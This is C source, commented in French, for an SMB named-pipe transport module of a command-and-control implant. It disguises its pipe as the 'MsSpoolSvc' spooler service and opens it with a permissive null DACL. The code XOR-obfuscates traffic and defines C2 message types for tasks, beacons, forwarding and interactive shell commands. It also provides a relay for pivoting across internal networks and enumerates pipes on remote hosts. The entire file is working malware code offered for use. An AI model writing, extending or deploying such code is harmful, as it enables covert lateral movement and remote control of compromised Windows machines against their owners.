/*
 * pipe.c - SMB named pipes transport
 * p2p entre agents, pivot interne
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "pipe.h"

// ============================================================================
// CONFIGURATION
// ============================================================================

#define PIPE_BUFFER_SIZE    65536       // 64KB buffer
#define PIPE_TIMEOUT        5000        // 5 secondes timeout
#define PIPE_MAX_INSTANCES  10          // Max connexions simultanées

// Noms de pipes par défaut (customisables)
#define DEFAULT_PIPE_NAME   "\\\\.\\pipe\\MsSpoolSvc"
#define REMOTE_PIPE_FORMAT  "\\\\%s\\pipe\\MsSpoolSvc"

// ============================================================================
// STRUCTURES INTERNES
// ============================================================================

typedef struct _PIPE_SERVER {
    HANDLE hPipe;
    char pipe_name[MAX_PATH];
    BOOL running;
    BOOL connected;
    BYTE xor_key[32];
    DWORD key_len;
} PIPE_SERVER;

typedef struct _PIPE_CLIENT {
    HANDLE hPipe;
    char target[MAX_PATH];
    BOOL connected;
    BYTE xor_key[32];
    DWORD key_len;
} PIPE_CLIENT;

// ============================================================================
// CHIFFREMENT SIMPLE (XOR)
// ============================================================================

/**
 * @brief Chiffre/déchiffre des données avec XOR
 */
static void Pipe_XorCrypt(BYTE* data, DWORD len, const BYTE* key, DWORD key_len) {
    if (!key_len) return;
    for (DWORD i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

/**
 * @brief Génère une clé XOR aléatoire
 */
static void Pipe_GenerateKey(BYTE* key, DWORD key_len) {
    for (DWORD i = 0; i < key_len; i++) {
        key[i] = (BYTE)(rand() & 0xFF);
    }
}

// ============================================================================
// SERVEUR PIPE
// ============================================================================

/**
 * @brief Crée un serveur named pipe
 * @param pipe_name Nom du pipe (NULL = défaut)
 * @param key Clé XOR (NULL = pas de chiffrement)
 * @param key_len Longueur de la clé
 * @return Handle vers le serveur ou NULL
 */
PIPE_SERVER* Pipe_CreateServer(const char* pipe_name, const BYTE* key, DWORD key_len) {
    PIPE_SERVER* server = (PIPE_SERVER*)malloc(sizeof(PIPE_SERVER));
    if (!server) return NULL;
    
    memset(server, 0, sizeof(PIPE_SERVER));
    
    // Nom du pipe
    if (pipe_name) {
        strncpy(server->pipe_name, pipe_name, MAX_PATH - 1);
    } else {
        strncpy(server->pipe_name, DEFAULT_PIPE_NAME, MAX_PATH - 1);
    }
    
    // Clé de chiffrement
    if (key && key_len > 0 && key_len <= 32) {
        memcpy(server->xor_key, key, key_len);
        server->key_len = key_len;
    }
    
    // Créer le pipe avec sécurité permissive
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    
    SECURITY_ATTRIBUTES sa = {
        .nLength = sizeof(SECURITY_ATTRIBUTES),
        .lpSecurityDescriptor = &sd,
        .bInheritHandle = FALSE
    };
    
    server->hPipe = CreateNamedPipeA(
        server->pipe_name,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        PIPE_MAX_INSTANCES,
        PIPE_BUFFER_SIZE,
        PIPE_BUFFER_SIZE,
        PIPE_TIMEOUT,
        &sa
    );
    
    if (server->hPipe == INVALID_HANDLE_VALUE) {
        free(server);
        return NULL;
    }
    
    server->running = TRUE;
    return server;
}

/**
 * @brief Attend une connexion client sur le pipe
 * @param server Handle serveur
 * @param timeout_ms Timeout en millisecondes (0 = infini)
 * @return TRUE si un client s'est connecté
 */
BOOL Pipe_WaitForConnection(PIPE_SERVER* server, DWORD timeout_ms) {
    if (!server || server->hPipe == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    OVERLAPPED ov = {0};
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    
    BOOL result = ConnectNamedPipe(server->hPipe, &ov);
    
    if (!result) {
        DWORD err = GetLastError();
        if (err == ERROR_PIPE_CONNECTED) {
            // Client déjà connecté
            server->connected = TRUE;
            CloseHandle(ov.hEvent);
            return TRUE;
        } else if (err == ERROR_IO_PENDING) {
            // Attendre la connexion
            DWORD wait_result = WaitForSingleObject(ov.hEvent, 
                timeout_ms == 0 ? INFINITE : timeout_ms);
            
            if (wait_result == WAIT_OBJECT_0) {
                DWORD bytes;
                if (GetOverlappedResult(server->hPipe, &ov, &bytes, FALSE)) {
                    server->connected = TRUE;
                    CloseHandle(ov.hEvent);
                    return TRUE;
                }
            }
        }
    }
    
    CloseHandle(ov.hEvent);
    return FALSE;
}

/**
 * @brief Lit un message du pipe serveur
 * @param server Handle serveur
 * @param buffer Buffer de réception
 * @param buffer_size Taille du buffer
 * @param bytes_read Nombre d'octets lus (output)
 * @return TRUE si succès
 */
BOOL Pipe_ServerRead(PIPE_SERVER* server, BYTE* buffer, DWORD buffer_size, DWORD* bytes_read) {
    if (!server || !server->connected || !buffer) {
        return FALSE;
    }
    
    BOOL result = ReadFile(server->hPipe, buffer, buffer_size, bytes_read, NULL);
    
    if (result && *bytes_read > 0 && server->key_len > 0) {
        // Déchiffrer les données
        Pipe_XorCrypt(buffer, *bytes_read, server->xor_key, server->key_len);
    }
    
    return result;
}

/**
 * @brief Écrit un message sur le pipe serveur
 * @param server Handle serveur
 * @param data Données à envoyer
 * @param data_len Taille des données
 * @return TRUE si succès
 */
BOOL Pipe_ServerWrite(PIPE_SERVER* server, const BYTE* data, DWORD data_len) {
    if (!server || !server->connected || !data) {
        return FALSE;
    }
    
    BYTE* send_buffer = (BYTE*)malloc(data_len);
    if (!send_buffer) return FALSE;
    
    memcpy(send_buffer, data, data_len);
    
    // Chiffrer si clé définie
    if (server->key_len > 0) {
        Pipe_XorCrypt(send_buffer, data_len, server->xor_key, server->key_len);
    }
    
    DWORD written;
    BOOL result = WriteFile(server->hPipe, send_buffer, data_len, &written, NULL);
    
    free(send_buffer);
    return result && (written == data_len);
}

/**
 * @brief Déconnecte le client actuel et prépare pour le suivant
 */
BOOL Pipe_ServerDisconnect(PIPE_SERVER* server) {
    if (!server) return FALSE;
    
    server->connected = FALSE;
    FlushFileBuffers(server->hPipe);
    DisconnectNamedPipe(server->hPipe);
    
    return TRUE;
}

/**
 * @brief Ferme le serveur pipe
 */
void Pipe_DestroyServer(PIPE_SERVER* server) {
    if (!server) return;
    
    server->running = FALSE;
    if (server->hPipe != INVALID_HANDLE_VALUE) {
        DisconnectNamedPipe(server->hPipe);
        CloseHandle(server->hPipe);
    }
    
    // Effacer la clé de la mémoire
    SecureZeroMemory(server->xor_key, sizeof(server->xor_key));
    free(server);
}

// ============================================================================
// CLIENT PIPE
// ============================================================================

/**
 * @brief Crée un client et se connecte à un pipe distant
 * @param target Machine cible (hostname ou IP)
 * @param pipe_name Nom du pipe (NULL = défaut)
 * @param key Clé XOR (NULL = pas de chiffrement)
 * @param key_len Longueur de la clé
 * @return Handle client ou NULL
 */
PIPE_CLIENT* Pipe_Connect(const char* target, const char* pipe_name, 
                          const BYTE* key, DWORD key_len) {
    PIPE_CLIENT* client = (PIPE_CLIENT*)malloc(sizeof(PIPE_CLIENT));
    if (!client) return NULL;
    
    memset(client, 0, sizeof(PIPE_CLIENT));
    
    // Construire le chemin du pipe distant
    char full_pipe[MAX_PATH];
    if (pipe_name) {
        snprintf(full_pipe, sizeof(full_pipe), "\\\\%s\\pipe\\%s", target, pipe_name);
    } else {
        snprintf(full_pipe, sizeof(full_pipe), REMOTE_PIPE_FORMAT, target);
    }
    
    strncpy(client->target, target, MAX_PATH - 1);
    
    // Clé de chiffrement
    if (key && key_len > 0 && key_len <= 32) {
        memcpy(client->xor_key, key, key_len);
        client->key_len = key_len;
    }
    
    // Attendre que le pipe soit disponible
    if (!WaitNamedPipeA(full_pipe, PIPE_TIMEOUT)) {
        free(client);
        return NULL;
    }
    
    // Se connecter
    client->hPipe = CreateFileA(
        full_pipe,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (client->hPipe == INVALID_HANDLE_VALUE) {
        free(client);
        return NULL;
    }
    
    // Configurer en mode message
    DWORD mode = PIPE_READMODE_MESSAGE;
    SetNamedPipeHandleState(client->hPipe, &mode, NULL, NULL);
    
    client->connected = TRUE;
    return client;
}

/**
 * @brief Lit un message du pipe client
 */
BOOL Pipe_ClientRead(PIPE_CLIENT* client, BYTE* buffer, DWORD buffer_size, DWORD* bytes_read) {
    if (!client || !client->connected || !buffer) {
        return FALSE;
    }
    
    BOOL result = ReadFile(client->hPipe, buffer, buffer_size, bytes_read, NULL);
    
    if (result && *bytes_read > 0 && client->key_len > 0) {
        Pipe_XorCrypt(buffer, *bytes_read, client->xor_key, client->key_len);
    }
    
    return result;
}

/**
 * @brief Écrit un message sur le pipe client
 */
BOOL Pipe_ClientWrite(PIPE_CLIENT* client, const BYTE* data, DWORD data_len) {
    if (!client || !client->connected || !data) {
        return FALSE;
    }
    
    BYTE* send_buffer = (BYTE*)malloc(data_len);
    if (!send_buffer) return FALSE;
    
    memcpy(send_buffer, data, data_len);
    
    if (client->key_len > 0) {
        Pipe_XorCrypt(send_buffer, data_len, client->xor_key, client->key_len);
    }
    
    DWORD written;
    BOOL result = WriteFile(client->hPipe, send_buffer, data_len, &written, NULL);
    
    free(send_buffer);
    return result && (written == data_len);
}

/**
 * @brief Ferme la connexion client
 */
void Pipe_Disconnect(PIPE_CLIENT* client) {
    if (!client) return;
    
    client->connected = FALSE;
    if (client->hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(client->hPipe);
    }
    
    SecureZeroMemory(client->xor_key, sizeof(client->xor_key));
    free(client);
}

// ============================================================================
// PROTOCOLE C2 OVER PIPE
// ============================================================================

// Format message: [4 bytes len][1 byte type][payload]
typedef enum {
    MSG_TASK     = 0x01,    // Tâche à exécuter
    MSG_RESULT   = 0x02,    // Résultat de tâche
    MSG_BEACON   = 0x03,    // Heartbeat
    MSG_FORWARD  = 0x04,    // Forward vers autre agent
    MSG_SHELL    = 0x05     // Commande shell interactive
} PIPE_MSG_TYPE;

/**
 * @brief Envoie un message formaté C2
 */
BOOL Pipe_SendMessage(HANDLE hPipe, PIPE_MSG_TYPE type, const BYTE* payload, DWORD payload_len,
                      const BYTE* key, DWORD key_len) {
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;
    
    // Construire le message
    DWORD msg_len = 5 + payload_len;  // 4 bytes len + 1 byte type + payload
    BYTE* msg = (BYTE*)malloc(msg_len);
    if (!msg) return FALSE;
    
    // Header
    *(DWORD*)msg = payload_len + 1;  // Taille incluant le type
    msg[4] = (BYTE)type;
    
    // Payload
    if (payload && payload_len > 0) {
        memcpy(msg + 5, payload, payload_len);
    }
    
    // Chiffrer
    if (key && key_len > 0) {
        Pipe_XorCrypt(msg + 4, msg_len - 4, key, key_len);  // Skip length header
    }
    
    DWORD written;
    BOOL result = WriteFile(hPipe, msg, msg_len, &written, NULL);
    
    free(msg);
    return result && (written == msg_len);
}

/**
 * @brief Reçoit un message formaté C2
 * @param type Type de message reçu (output)
 * @param payload Buffer pour le payload (output)
 * @param payload_len Taille du payload (output)
 */
BOOL Pipe_RecvMessage(HANDLE hPipe, PIPE_MSG_TYPE* type, BYTE* payload, 
                      DWORD max_len, DWORD* payload_len,
                      const BYTE* key, DWORD key_len) {
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;
    
    // Lire le header (4 bytes length)
    DWORD header_len;
    DWORD bytes_read;
    
    if (!ReadFile(hPipe, &header_len, 4, &bytes_read, NULL) || bytes_read != 4) {
        return FALSE;
    }
    
    if (header_len > max_len + 1) {
        return FALSE;  // Message trop grand
    }
    
    // Lire le reste du message
    BYTE* msg = (BYTE*)malloc(header_len);
    if (!msg) return FALSE;
    
    if (!ReadFile(hPipe, msg, header_len, &bytes_read, NULL) || bytes_read != header_len) {
        free(msg);
        return FALSE;
    }
    
    // Déchiffrer
    if (key && key_len > 0) {
        Pipe_XorCrypt(msg, header_len, key, key_len);
    }
    
    // Parser
    *type = (PIPE_MSG_TYPE)msg[0];
    *payload_len = header_len - 1;
    
    if (*payload_len > 0) {
        memcpy(payload, msg + 1, *payload_len);
    }
    
    free(msg);
    return TRUE;
}

// ============================================================================
// PIVOT / RELAY
// ============================================================================

/**
 * @brief Relaye un message d'un pipe à un autre (pour pivoting)
 */
BOOL Pipe_Relay(PIPE_SERVER* source, PIPE_CLIENT* dest) {
    if (!source || !dest || !source->connected || !dest->connected) {
        return FALSE;
    }
    
    BYTE buffer[PIPE_BUFFER_SIZE];
    DWORD bytes_read;
    
    // Lire depuis la source
    if (!Pipe_ServerRead(source, buffer, sizeof(buffer), &bytes_read)) {
        return FALSE;
    }
    
    // Écrire vers la destination
    if (!Pipe_ClientWrite(dest, buffer, bytes_read)) {
        return FALSE;
    }
    
    return TRUE;
}

/**
 * @brief Démarre un serveur de relay entre deux réseaux
 * @param local_pipe Nom du pipe local
 * @param remote_host Machine distante
 * @param remote_pipe Nom du pipe distant
 */
BOOL Pipe_StartRelay(const char* local_pipe, const char* remote_host, 
                     const char* remote_pipe, const BYTE* key, DWORD key_len) {
    // Créer le serveur local
    PIPE_SERVER* server = Pipe_CreateServer(local_pipe, key, key_len);
    if (!server) return FALSE;
    
    while (server->running) {
        // Attendre une connexion locale
        if (!Pipe_WaitForConnection(server, 5000)) {
            continue;
        }
        
        // Se connecter au distant
        PIPE_CLIENT* client = Pipe_Connect(remote_host, remote_pipe, key, key_len);
        if (!client) {
            Pipe_ServerDisconnect(server);
            continue;
        }
        
        // Relayer les messages
        while (server->connected && client->connected) {
            // Relay bidirectionnel avec threads
            // TODO: Implémenter avec threads pour full-duplex
            Pipe_Relay(server, client);
        }
        
        Pipe_Disconnect(client);
        Pipe_ServerDisconnect(server);
    }
    
    Pipe_DestroyServer(server);
    return TRUE;
}

// ============================================================================
// UTILITAIRES
// ============================================================================

/**
 * @brief Vérifie si un pipe existe sur une machine
 */
BOOL Pipe_Exists(const char* target, const char* pipe_name) {
    char full_pipe[MAX_PATH];
    
    if (target) {
        snprintf(full_pipe, sizeof(full_pipe), "\\\\%s\\pipe\\%s", target, pipe_name);
    } else {
        snprintf(full_pipe, sizeof(full_pipe), "\\\\.\\pipe\\%s", pipe_name);
    }
    
    HANDLE hPipe = CreateFileA(
        full_pipe,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(hPipe);
        return TRUE;
    }
    
    return FALSE;
}

/**
 * @brief Liste les pipes disponibles sur une machine
 * (Nécessite des privilèges pour énumérer)
 */
BOOL Pipe_EnumeratePipes(const char* target, char* output, DWORD output_size) {
    WIN32_FIND_DATAA fd;
    HANDLE hFind;
    char search_path[MAX_PATH];
    DWORD offset = 0;
    
    if (target) {
        snprintf(search_path, sizeof(search_path), "\\\\%s\\pipe\\*", target);
    } else {
        strncpy(search_path, "\\\\.\\pipe\\*", sizeof(search_path));
    }
    
    hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    output[0] = '\0';
    
    do {
        int written = snprintf(output + offset, output_size - offset, "%s\n", fd.cFileName);
        if (written > 0) {
            offset += written;
        }
        if (offset >= output_size - 1) break;
    } while (FindNextFileA(hFind, &fd));
    
    FindClose(hFind);
    return TRUE;
}
